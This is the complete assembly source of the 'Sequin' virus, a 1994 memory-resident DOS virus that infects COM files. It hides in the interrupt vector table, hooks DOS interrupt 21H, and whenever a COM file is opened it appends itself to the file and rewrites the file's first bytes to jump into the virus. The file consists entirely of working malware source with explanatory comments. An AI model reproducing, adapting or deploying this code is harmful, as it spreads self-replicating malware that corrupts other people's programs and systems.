;The Sequin Virus
;
;This is a memory resident COM infector that hides in the interrupt vector
;table, starting at 0:200H. COM files are infected when opened for any reason.
;
;(C) 1994 American Eagle Publications, Inc. All Rights Reserved.
;

.model  tiny
.code

IVOFS   EQU     100H

        ORG     100H

;This code checks to see if the virus is already in memory. If so, it just goes
;to execute the host. If not, it loads the virus in memory and then executes
;the host.
SEQUIN:
        call    IN_MEMORY                       ;is virus in memory?
        jz      EXEC_HOST                       ;yes, execute the host

        mov     di,IVOFS + 100H                 ;nope, put it in memory
        mov     si,100H
        mov     cx,OFFSET END_SEQUIN - 105H
        rep     movsb                           ;first move it there

        mov     bx,21H*4                        ;next setup int vector 21H
;       xor     ax,ax                           ;ax still 0 from IN_MEMORY
        xchg    ax,es:[bx+2]                    ;get/set segment
        mov     cx,ax
        mov     ax,OFFSET INT_21 + IVOFS
        xchg    ax,es:[bx]                      ;get/set offset
        mov     di,OFFSET OLD_21 + IVOFS        ;and save old seg/offset
        stosw
        mov     ax,cx
        stosw                                   ;ok, that's it, virus is resident

;The following code executes the host by moving the five bytes stored in
;HSTBUF down to offset 100H and transferring control to it.
EXEC_HOST:
        push    ds                              ;restore es register
        pop     es
        mov     si,bp
        add     si,OFFSET HSTBUF - 103H
        mov     di,100H
        push    di
        mov     cx,5
        rep     movsb
        ret


;This routine checks to see if SEQUIN is already in memory by comparing the
;first 10 bytes of int 21H handler with what's sitting in memory in the
;interrupt vector table.
IN_MEMORY:
        xor     ax,ax                           ;set es segment = 0
        mov     es,ax
        mov     di,OFFSET INT_21 + IVOFS        ;di points to start of virus
        mov     bp,sp                           ;get absolute return @
        mov     si,[bp]                         ;to si
        mov     bp,si                           ;save it in bp too
        add     si,OFFSET INT_21 - 103H         ;point to int 21H handler here
        mov     cx,10                           ;compare 10 bytes
        repz    cmpsb
        ret

;This is the interrupt 21H handler. It looks for any attempts to open a file,
;and when found, the virus swings into action. Note that this piece of code is
;always executed from the virus in the interrupt table. Thus, all data
;addressing must add 100H to the compiled values to work.
OLD_21  DD      ?
INT_21:
        cmp     ah,3DH                          ;opening a file?
        je      INFECT_FILE                     ;yes, virus awakens
I21E:   jmp     DWORD PTR cs:[OLD_21+IVOFS]     ;no, just let DOS have this int

;Here we process requests to open files. This routine will open the file,
;check to see if the virus is there, and if not, add it. Then it will close the
;file and let the original DOS handler open it again.
INFECT_FILE:
        push    ax
        push    si
        push    dx
        push    ds

        mov     si,dx                           ;now see if a COM file
FO1:    lodsb
        or      al,al                           ;null terminator?
        jz      FEX                             ;yes, not a COM file
        cmp     al,'.'                          ;a period?
        jne     FO1                             ;no, get another byte
        lodsw                                   ;yes, check for COM extent
        or      ax,2020H
        cmp     ax,'oc'
        jne     FEX
        lodsb
        or      al,20H
        cmp     al,'m'
        jne     FEX                             ;exit if not COM file

        mov     ax,3D02H                        ;open file in read/write mode
        pushf
        call    DWORD PTR cs:[OLD_21 + IVOFS]
        jc      FEX                             ;exit if error opening
        mov     bx,ax                           ;put handle in bx
        push    cs
        pop     ds

        mov     ah,3FH                          ;read 5 bytes from start
        mov     cx,5                            ;of file
        mov     dx,OFFSET HSTBUF + IVOFS
        int     21H

        mov     ax,WORD PTR [HSTBUF + IVOFS]    ;now check host for infectability
        cmp     ax,'ZM'                         ;is it really an EXE?
        je      FEX1
        cmp     ax,37B4H                        ;is first instruction "mov ah,37"?
        je      FEX1                            ;yes, already infected

        xor     cx,cx
        xor     dx,dx
        mov     ax,4202H                        ;move file pointer to end
        int     21H
        push    ax                              ;save file size

        mov     ah,40H                          ;and write virus to file
        mov     dx,IVOFS + 100H
        mov     cx,OFFSET END_SEQUIN - 100H
        int     21H

        xor     cx,cx                           ;file pointer back to start
        xor     dx,dx
        mov     ax,4200H
        int     21H

        mov     WORD PTR [HSTBUF + IVOFS],37B4H ;now set up first 5 bytes
        mov     BYTE PTR [HSTBUF + IVOFS+2],0E9H;with mov ah,37/jmp SEQUIN
        pop     ax
        sub     ax,5
        mov     WORD PTR [HSTBUF + IVOFS+3],ax

        mov     dx,OFFSET HSTBUF + IVOFS        ;write jump to virus to file
        mov     cx,5
        mov     ah,40H
        int     21H

FEX1:   mov     ah,3EH                          ;then close the file
        int     21H

FEX:    pop     ds
        pop     dx
        pop     si
        pop     ax
        jmp     I21E

HSTBUF:
        mov     ax,4C00H
        int     21H

END_SEQUIN:                                     ;label for end of the virus

        END     SEQUIN
